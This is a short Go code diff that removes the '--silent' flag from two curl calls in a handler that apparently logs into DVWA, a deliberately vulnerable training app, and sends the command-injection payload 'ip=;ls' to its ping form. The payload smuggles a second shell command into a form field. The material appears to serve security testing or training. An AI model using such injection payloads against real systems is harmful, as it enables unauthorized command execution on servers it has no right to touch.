@@ -62,7 +62,6 @@ func handleCommandInjectionAction(c echo.Context) error {
 		"-H", "referer: "+DVWA_URL+"/",
 		"-H", "user-agent: "+USER_AGENT,
 		"--insecure",
-		"--silent",
 		"--data-raw", "username="+username+"&password="+password+"&Login=Login",
 		"-c", "cookie.txt",
 	)
@@ -81,7 +80,6 @@ func handleCommandInjectionAction(c echo.Context) error {
 		"-H", "referer: "+DVWA_URL+"/index.php",
 		"-H", "user-agent: "+USER_AGENT,
 		"--insecure",
-		"--silent",
 		"--data-raw", "ip=;ls&Submit=Submit",
 		"-b", "cookie.txt",
 	)
